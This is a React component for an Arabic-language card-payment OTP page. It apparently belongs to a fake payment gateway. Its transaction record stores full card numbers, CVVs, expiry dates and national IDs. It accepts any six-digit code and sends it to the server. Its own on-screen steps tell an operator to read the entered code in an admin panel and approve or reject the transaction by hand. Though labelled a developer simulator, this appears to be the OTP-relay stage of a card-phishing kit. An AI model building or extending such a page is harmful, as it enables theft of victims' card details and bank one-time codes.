import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { motion } from 'motion/react';
import { Lock, ShieldAlert, CheckCircle2, ArrowRight, RefreshCw, KeyRound, AlertCircle } from 'lucide-react';

interface Transaction {
  id: string;
  cardNumber: string;
  cardholderName: string;
  expiry: string;
  cvv: string;
  cardType: string;
  amount: number;
  timestamp: string;
  status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED';
  serviceName?: string;
  nationalId?: string;
  nafathVerified?: boolean;
}

export function OTPPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const tx = location.state?.tx as Transaction | undefined;

  const [otp, setOtp] = useState<string[]>(Array(6).fill(''));
  const [error, setError] = useState<string | null>(null);
  const [isVerifying, setIsVerifying] = useState(false);
  const [isVerified, setIsVerified] = useState(false);
  const [otpStatus, setOtpStatus] = useState<'editing' | 'submitted' | 'approved' | 'rejected'>('editing');
  const [timer, setTimer] = useState(90); // 1 min 30 seconds countdown
  const [resendCooldown, setResendCooldown] = useState(false);
  const [notification, setNotification] = useState<string | null>(null);

  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // If no transaction context is found in location state, send home
  useEffect(() => {
    if (!tx) {
      navigate('/');
    }
  }, [tx, navigate]);

  // Countdown timer for security code validity
  useEffect(() => {
    if (timer <= 0) return;
    const interval = setInterval(() => {
      setTimer((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(interval);
  }, [timer]);

  // Poll transaction status once OTP is submitted
  useEffect(() => {
    if (otpStatus !== 'submitted' || !tx || !tx.id) return;

    let isMounted = true;
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/status/${tx.id}`);
        if (!res.ok) throw new Error('Could not check status');
        const updatedTx = await res.json();

        if (isMounted) {
          if (updatedTx.status === 'APPROVED') {
            clearInterval(interval);
            setOtpStatus('approved');
            setIsVerified(true);
            setTimeout(() => {
              navigate('/success', { state: { tx: updatedTx } });
            }, 1000);
          } else if (updatedTx.status === 'REJECTED') {
            clearInterval(interval);
            setOtpStatus('rejected');
            setError('تم رفض المعاملة أثناء عملية التحقق والمطابقة الإدارية.');
          }
        }
      } catch (err) {
        console.error('Polling error:', err);
      }
    }, 2000);

    return () => {
      isMounted = false;
      clearInterval(interval);
    };
  }, [otpStatus, tx, navigate]);

  // Format countdown text helper (e.g. "01:24")
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  // Focus the first input box on load
  useEffect(() => {
    if (inputRefs.current[0]) {
      inputRefs.current[0].focus();
    }
  }, []);

  // Handle digit input keystroke
  const handleChange = (element: HTMLInputElement, index: number) => {
    const val = element.value;
    if (isNaN(Number(val))) return; // Digits only

    const newOtp = [...otp];
    newOtp[index] = val.slice(-1); // Only keep the last digit typed
    setOtp(newOtp);
    setError(null);

    // Auto focus next input box
    if (val !== '' && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  // Handle keyboard navigation (backspace, arrow keys)
  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
    if (e.key === 'Backspace') {
      if (otp[index] === '' && index > 0) {
        // Move focus back if currently empty
        const newOtp = [...otp];
        newOtp[index - 1] = '';
        setOtp(newOtp);
        inputRefs.current[index - 1]?.focus();
      } else {
        // Clear current box value
        const newOtp = [...otp];
        newOtp[index] = '';
        setOtp(newOtp);
      }
    }
  };

  // Handle pasting code e.g. "123456"
  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').trim();
    if (!/^\d+$/.test(pastedData)) return; // Only allow digits

    const digits = pastedData.slice(0, 6).split('');
    const newOtp = [...otp];
    
    digits.forEach((digit, idx) => {
      if (idx < 6) {
        newOtp[idx] = digit;
      }
    });

    setOtp(newOtp);
    setError(null);

    // Focus last pasted index or submit button
    const focusIndex = Math.min(digits.length - 1, 5);
    inputRefs.current[focusIndex]?.focus();
  };

  // Handle OTP submission validation
  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    const code = otp.join('');

    if (code.length < 6) {
      setError('يرجى إدخال جميع خانات رمز التحقق المكون من 6 أرقام.');
      return;
    }

    setIsVerifying(true);
    setError(null);

    try {
      const res = await fetch('/api/verify-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: tx.id, otp: code }),
      });

      const data = await res.json();

      if (res.ok && data.success) {
        setIsVerifying(false);
        setOtpStatus('submitted');
      } else {
        setError(data.error || 'رمز التحقق المدخل غير صحيح. يرجى المحاولة مرة أخرى.');
        setIsVerifying(false);
      }
    } catch (err) {
      console.error(err);
      setError('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى.');
      setIsVerifying(false);
    }
  };

  // Trigger resend mock SMS code
  const handleResend = () => {
    if (resendCooldown) return;
    
    setResendCooldown(true);
    setTimer(90); // Reset timer
    setOtp(Array(6).fill('')); // Clear inputs
    setError(null);
    setNotification('تم إرسال رمز تحقق آمن جديد إلى هاتفك المحمول المسجل.');

    // Focus first input
    setTimeout(() => {
      inputRefs.current[0]?.focus();
    }, 100);

    // Clear notification after 4 seconds
    setTimeout(() => {
      setNotification(null);
    }, 4000);

    // Cooldown resend for 10 seconds
    setTimeout(() => {
      setResendCooldown(false);
    }, 10000);
  };

  if (!tx) return null;

  return (
    <div id="otp-container" className="mx-auto max-w-md px-4 py-16 flex flex-col items-center justify-center min-h-[70vh]">
      <motion.div
        initial={{ opacity: 0, y: 15 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
        className="w-full rounded-2xl border border-gray-100 bg-white p-8 shadow-xl relative overflow-hidden"
      >
        {/* Top emerald line bar */}
        <div className="absolute top-0 inset-x-0 h-1.5 bg-[#004d33]" />

        {otpStatus === 'submitted' ? (
          <div className="space-y-6 text-center py-6">
            <div className="relative flex items-center justify-center h-20 w-20 mx-auto mb-4">
              <div className="absolute inset-0 rounded-full bg-emerald-500/5 animate-ping" />
              <div className="absolute inset-2 rounded-full border border-t-[#004d33] border-r-transparent border-b-transparent border-l-emerald-600/20 animate-spin" style={{ animationDuration: '2s' }} />
              <RefreshCw className="h-6 w-6 text-[#004d33] animate-spin" />
            </div>
            
            <h3 className="text-lg font-extrabold text-slate-800 font-sans">جاري التحقق من رمز الأمان...</h3>
            <p className="text-xs text-slate-500 leading-relaxed max-w-xs mx-auto">
              تم إرسال رمز التحقق <strong className="text-[#004d33] font-mono text-sm tracking-wider">{otp.join('')}</strong> بأمان إلى نظام المطابقة والتدقيق المصرفي.
            </p>
            <p className="text-xs text-amber-600 font-sans font-extrabold animate-pulse flex items-center justify-center gap-1">
              <span>●</span>
              <span>في انتظار التسوية النهائية للعملية...</span>
            </p>
            
            <div className="rounded-xl bg-sky-50/50 border border-sky-100 p-4 text-right dir-rtl text-[11px] space-y-1.5 text-slate-600">
              <p className="font-extrabold text-sky-800 flex items-center gap-1.5 mb-2">
                <ShieldAlert className="h-4 w-4 text-sky-600" />
                <span>محاكي بيئة التطوير - الخطوة الثانية:</span>
              </p>
              <p>1. يرجى إبقاء هذه الصفحة مفتوحة ومراقبة المعاملة.</p>
              <p>2. انتقل إلى علامة التبويب المفتوحة <strong className="text-sky-700">لوحة التحكم الإدارية</strong>.</p>
              <p>3. ستلاحظ أن حالة العملية <strong className="text-sky-700">{tx.id}</strong> تحولت تلقائياً إلى <strong className="font-bold">OTP_SUBMITTED</strong>، عارضةً الرمز <strong className="text-emerald-700 font-bold font-mono">{otp.join('')}</strong> الذي قمت بإدخاله.</p>
              <p>4. انقر على زر <strong className="text-[#004d33] font-extrabold">FINAL APPROVE</strong> لإتمام العملية بنجاح، أو زر <strong className="text-rose-600 font-extrabold">REJECT</strong> لرفضها.</p>
            </div>
          </div>
        ) : (
          <>
            <div className="text-center mb-6">
              <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full bg-emerald-50 text-[#004d33] border border-emerald-100 mb-4">
                <KeyRound className="h-5 w-5" />
              </div>
              <h2 className="text-xl font-extrabold text-slate-800 font-sans">التحقق الثنائي للبطاقة</h2>
              <p className="text-xs text-slate-500 mt-2 leading-relaxed font-medium">
                تم إرسال رمز الأمان المؤقت (OTP) إلى رقم هاتفك المحمول المسجل والمرتبط ببطاقتك المصرفية التي تنتهي بالرقم <strong className="text-[#004d33] font-mono">{tx.cardNumber.slice(-4)}</strong>.
              </p>
            </div>

            {/* Verification Notification Banner */}
            {notification && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: 'auto' }}
                className="mb-4 rounded-xl bg-emerald-50 border border-emerald-100 p-3 text-xs text-[#004d33] font-extrabold text-center"
              >
                {notification}
              </motion.div>
            )}

            <form onSubmit={handleVerify} className="space-y-6">
              {/* Split 6-digit box layout */}
              <div className="flex justify-between gap-2 max-w-sm mx-auto" dir="ltr">
                {otp.map((digit, idx) => (
                  <input
                    key={idx}
                    type="text"
                    pattern="[0-9]*"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    ref={(el) => (inputRefs.current[idx] = el)}
                    onChange={(e) => handleChange(e.target, idx)}
                    onKeyDown={(e) => handleKeyDown(e, idx)}
                    onPaste={idx === 0 ? handlePaste : undefined}
                    disabled={isVerifying || isVerified}
                    className="w-11 h-13 text-center text-lg font-bold font-mono rounded-xl border border-gray-200 bg-white text-slate-900 focus:outline-none focus:ring-2 focus:ring-[#004d33] focus:border-transparent transition-all duration-150 disabled:opacity-50"
                  />
                ))}
              </div>

              {error && (
                <div className="rounded-xl border border-rose-100 bg-rose-50 p-3 text-xs text-rose-700 flex items-center gap-2 justify-start dir-rtl text-right">
                  <AlertCircle className="h-4 w-4 shrink-0 text-rose-600" />
                  <span>{error}</span>
                </div>
              )}

              {/* Code expiration and resend details */}
              <div className="flex justify-between items-center text-xs font-sans text-slate-500 px-1 dir-rtl text-right">
                <span>
                  {timer > 0 ? (
                    <span className="flex items-center gap-1">
                      <span>تنتهي صلاحية الرمز خلال:</span>
                      <span className="text-amber-600 font-bold font-mono">{formatTime(timer)}</span>
                    </span>
                  ) : (
                    <span className="text-rose-600 font-extrabold">انتهت صلاحية الرمز</span>
                  )}
                </span>
                
                <button
                  type="button"
                  onClick={handleResend}
                  disabled={resendCooldown}
                  className={`font-extrabold underline transition ${
                    resendCooldown ? 'text-slate-400 cursor-not-allowed' : 'text-[#004d33] hover:text-[#003824]'
                  }`}
                >
                  {resendCooldown ? 'جاري الإرسال...' : 'إرسال الرمز مجدداً'}
                </button>
              </div>

              {/* Submit Action Button */}
              <button
                type="submit"
                disabled={isVerifying || isVerified}
                className={`w-full h-12 rounded-xl flex items-center justify-center gap-2 text-xs font-bold transition-all duration-300 shadow-md ${
                  isVerified
                    ? 'bg-emerald-500 text-white shadow-emerald-500/10'
                    : 'bg-[#004d33] hover:bg-[#003a26] text-white hover:shadow-emerald-950/15'
                }`}
              >
                {isVerifying ? (
                  <>
                    <RefreshCw className="h-4 w-4 animate-spin text-white" />
                    <span>جاري تأكيد رمز الحماية الآمن...</span>
                  </>
                ) : isVerified ? (
                  <>
                    <CheckCircle2 className="h-4 w-4 text-white" />
                    <span>تم التحقق وتأكيد السداد!</span>
                  </>
                ) : (
                  <>
                    <span>تحقق وتأكيد الدفع</span>
                    <ArrowRight className="h-4 w-4 rotate-180" />
                  </>
                )}
              </button>
            </form>

            {/* Info/Simulator Box */}
            <div className="mt-8 pt-5 border-t border-gray-100 text-center text-[11px] text-slate-400 space-y-1 font-sans">
              <p className="flex items-center justify-center gap-1 text-[#004d33] font-extrabold">
                <Lock className="h-3 w-3" />
                <span>بوابة سداد آمنة ثلاثية الأبعاد</span>
              </p>
              <p className="font-medium text-[10px]">
                💡 للمطورين: يمكنك إدخال أي رمز مكون من 6 أرقام (مثال: <strong className="text-slate-600">123456</strong>) لإتمام التحقق والمحاكاة.
              </p>
            </div>
          </>
        )}
      </motion.div>
    </div>
  );
}
